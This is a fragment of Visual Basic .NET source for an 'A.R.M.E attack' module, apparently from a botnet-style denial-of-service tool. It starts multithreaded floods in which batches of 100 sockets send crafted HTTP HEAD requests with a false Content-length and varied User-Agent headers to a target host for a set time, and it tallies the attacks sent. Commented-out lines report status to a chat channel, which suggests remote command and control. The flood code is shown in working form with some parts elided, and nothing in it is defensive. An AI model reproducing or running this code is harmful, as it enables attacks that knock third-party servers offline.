...
Public Module ARME
    ...
    Public Sub StartARME(ByVal Host As String, ByVal Port As Integer, ByVal Threadsto As Integer, ByVal Time As Integer, ByVal data As String)
        If Not AttackRunning = True Then
            ...
            Mainmenu.changeStatus("A.R.M.E attack")
        ...
        Else
            ...
            'Form1.TalktoChannel("An ARME Attack is Already Running on " & HostToAttack)
        End If
    ...
    Private Sub lol()
        ...
        If ThreadsEnded <= ThreadstoUse Then
            'Form1.TalktoChannel("ARME Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
            Attacks = 0
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
    ...
    Public Sub StopARME()
        If AttackRunning = True Then
            ...
            'Form1.TalktoChannel("ARME Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
            Attacks = 0

        Else
            'Form1.TalktoChannel("ARME Attack:, Not Running!")
        End If
    End Sub
            ...
            Do While (stopwatch.Elapsed < span)
                Try
                    ...
                    For i = 0 To 100 - 1
                        ...
                        socketArray(i).Send(ASCIIEncoding.Default.GetBytes("HEAD /" & file & " HTTP/1.1" & ChrW(13) & ChrW(10) & "Host: " & HostToAttack.ToString() & ChrW(13) & ChrW(10) & "Content-length: 5235" & ChrW(13) & ChrW(10) & "User-Agent: " & headers() & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)))
                        Attacks = Attacks + 1
                        'Form1.requested = Attacks
                    Next i
                    Dim j As Integer
                    For j = 0 To 100 - 1
                        socketArray(j).Close()
